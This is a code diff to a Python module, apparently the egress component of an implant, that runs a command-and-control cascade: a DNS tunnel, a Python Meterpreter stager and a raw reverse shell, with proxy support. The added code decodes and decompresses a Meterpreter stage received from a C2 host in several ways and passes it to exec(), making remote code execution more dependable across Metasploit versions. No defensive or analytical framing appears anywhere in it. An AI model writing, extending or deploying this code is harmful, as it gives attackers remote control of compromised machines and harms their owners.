@@ -14,6 +14,7 @@ continues.  On total failure, the cascade retries after a
 configurable delay.
 """
 
+import base64
 import logging
 import os
 import re
@@ -24,6 +25,7 @@ import subprocess
 import sys
 import time
 import threading
+import zlib
 from pathlib import Path
 
 log = logging.getLogger("landnav.egress")
@@ -148,6 +150,128 @@ def _dns_tunnel_up():
     except Exception:
         return False
 
+# ── Stage Preparation ──────────────────────────────────────────
+
+def _log_stage_header(stage_bytes):
+    """Log the first bytes of the stage for debugging."""
+    preview = stage_bytes[:200]
+    hex_line = " ".join(f"{b:02x}" for b in preview[:64])
+    log.info("Stage header (hex, first 64 bytes): %s", hex_line)
+    try:
+        text_preview = preview.decode("utf-8", errors="replace")[:120]
+        log.info("Stage header (text, first 120 chars): %r", text_preview)
+    except Exception:
+        pass
+
+
+def _try_compile(candidate, label):
+    """Try to compile candidate as Python source. Returns code object or None."""
+    try:
+        return compile(candidate, "<meterpreter>", "exec")
+    except SyntaxError as e:
+        log.debug("Stage compile failed (%s): %s", label, e)
+        return None
+
+
+def _prepare_stage(raw_stage):
+    """Prepare MSF Python meterpreter stage for execution.
+
+    MSF 6.x python/meterpreter/reverse_tcp sends a Python stage over the
+    wire.  Depending on the MSF version and configuration, the stage can
+    arrive in several forms:
+
+      1. Raw Python 3 source (just exec it)
+      2. Python 2 source that needs minor fixups for Python 3
+      3. A binary configuration preamble followed by the Python source
+      4. zlib-compressed Python source (with or without binary offset)
+      5. base64-encoded then zlib-compressed
+
+    This function attempts each strategy and returns the first one that
+    compiles, or None if nothing works.
+    """
+    _log_stage_header(raw_stage)
+
+    # Strategy 1: raw bytes as-is (compile() accepts bytes in Python 3,
+    # treats them as UTF-8 source)
+    code = _try_compile(raw_stage, "raw bytes")
+    if code:
+        log.info("Stage: compiles as raw bytes")
+        return raw_stage
+
+    # Strategy 2: decode as UTF-8, then latin-1 fallback
+    for enc in ("utf-8", "latin-1"):
+        try:
+            stage_str = raw_stage.decode(enc)
+            code = _try_compile(stage_str, f"decoded {enc}")
+            if code:
+                log.info("Stage: compiles after %s decode", enc)
+                return stage_str
+        except (UnicodeDecodeError, SyntaxError):
+            pass
+
+    # Strategy 3: scan for Python code start — skip binary preamble.
+    # MSF may prepend transport configuration or other binary data.
+    _PY_MARKERS = [b"import ", b"exec(", b"exec (", b"#!", b"import\t",
+                   b"def ", b"class "]
+    for marker in _PY_MARKERS:
+        idx = raw_stage.find(marker)
+        if idx > 0:
+            trimmed = raw_stage[idx:]
+            code = _try_compile(trimmed, f"skip {idx}b to {marker!r}")
+            if code:
+                log.info("Stage: skipped %d-byte preamble (found %r at offset %d)",
+                         idx, marker, idx)
+                return trimmed
+
+    # Strategy 4: zlib decompress the whole thing (some MSF configs
+    # zlib the stage without a Python bootstrap)
+    for offset in (0, 4, 8, 16, 20):
+        if len(raw_stage) <= offset:
+            continue
+        try:
+            decompressed = zlib.decompress(raw_stage[offset:])
+            code = _try_compile(decompressed, f"zlib from offset {offset}")
+            if code:
+                log.info("Stage: zlib-decompressed from offset %d (%d -> %d bytes)",
+                         offset, len(raw_stage) - offset, len(decompressed))
+                return decompressed
+        except (zlib.error, SyntaxError):
+            pass
+
+    # Strategy 5: base64 decode then zlib (MSF sometimes b64-wraps)
+    for offset in (0, 4, 8, 16):
+        if len(raw_stage) <= offset:
+            continue
+        try:
+            decoded = base64.b64decode(raw_stage[offset:])
+            decompressed = zlib.decompress(decoded)
+            code = _try_compile(decompressed, f"b64+zlib from offset {offset}")
+            if code:
+                log.info("Stage: base64+zlib from offset %d", offset)
+                return decompressed
+        except Exception:
+            pass
+
+    # Strategy 6: try stripping every offset up to 256 bytes looking for
+    # compilable Python — catches arbitrary-length binary config headers
+    for offset in range(1, min(257, len(raw_stage))):
+        b = raw_stage[offset]
+        if b < 0x20 or b > 0x7e:
+            continue
+        if chr(b) not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_#\"'":
+            continue
+        trimmed = raw_stage[offset:]
+        code = _try_compile(trimmed, f"brute skip {offset}")
+        if code:
+            log.info("Stage: compilable after skipping %d bytes", offset)
+            return trimmed
+
+    log.error("Stage: all preparation strategies failed — cannot compile")
+    log.error("Stage: total size %d bytes, first 64 hex: %s",
+              len(raw_stage),
+              " ".join(f"{b:02x}" for b in raw_stage[:64]))
+    return None
+
 # ── Python Meterpreter ──────────────────────────────────────────
 
 def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
@@ -176,7 +300,7 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
     # Resolve hostname
     try:
         c2_ip = socket.gethostbyname(c2_host)
-        log.info("Resolved %s → %s", c2_host, c2_ip)
+        log.info("Resolved %s -> %s", c2_host, c2_ip)
     except socket.gaierror:
         log.error("Cannot resolve %s", c2_host)
         return False
@@ -220,12 +344,24 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 time.sleep(retry_delay)
                 continue
 
-            log.info("Meterpreter stage received — executing")
+            log.info("Meterpreter stage received (%d bytes) — preparing",
+                     len(stage))
+
+            # Prepare the stage — handle binary preambles, compression,
+            # encoding differences between MSF versions
+            prepared = _prepare_stage(stage)
+            if prepared is None:
+                log.error("Could not prepare meterpreter stage for execution")
+                s.close()
+                time.sleep(retry_delay)
+                continue
+
+            log.info("Meterpreter stage prepared — executing")
             _c2_method = "meterpreter"
 
-            # Execute the stage — this is the standard MSF python stager protocol.
-            # The stage expects 's' (the socket) to be available in its namespace.
-            exec(compile(stage, "<meterpreter>", "exec"), {"s": s})
+            # Execute the stage — the stage expects 's' (the socket)
+            # to be available in its namespace.
+            exec(compile(prepared, "<meterpreter>", "exec"), {"s": s})
 
             # If exec returns, the session ended
             log.info("Meterpreter session ended")
@@ -306,7 +442,7 @@ def try_reverse_shell(c2_host, ports, connect_timeout=10, proxy=None):
 def _connect_via_proxy(proxy_host, proxy_port, target_host, target_port,
                        timeout=10):
     """Establish a TCP connection through an HTTP CONNECT proxy."""
-    log.info("Connecting via proxy %s:%d → %s:%d",
+    log.info("Connecting via proxy %s:%d -> %s:%d",
              proxy_host, proxy_port, target_host, target_port)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -367,14 +503,14 @@ def run_cascade(config):
 
     # ── Method 1: DNS Tunnel ────────────────────────────────
     if dns_cfg.get("enabled", True):
-        log.info("═══ C2 Method 1: DNS Tunnel ═══")
+        log.info("=== C2 Method 1: DNS Tunnel ===")
         if try_dns_tunnel(dns_cfg):
             _current_state = EgressState.CONNECTED
             return "dns_tunnel"
 
     # ── Method 2: Python Meterpreter ────────────────────────
     if met_cfg.get("enabled", True):
-        log.info("═══ C2 Method 2: Python Meterpreter ═══")
+        log.info("=== C2 Method 2: Python Meterpreter ===")
         if try_meterpreter(
             c2_host, c2_ports,
             connect_timeout=met_cfg.get("connect_timeout", 10),
@@ -385,7 +521,7 @@ def run_cascade(config):
             return "meterpreter"
 
     # ── Method 3: Raw Reverse Shell ─────────────────────────
-    log.info("═══ C2 Method 3: Raw Reverse Shell ═══")
+    log.info("=== C2 Method 3: Raw Reverse Shell ===")
     if try_reverse_shell(c2_host, c2_ports, proxy=proxy):
         _current_state = EgressState.CONNECTED
         return "reverse_shell"
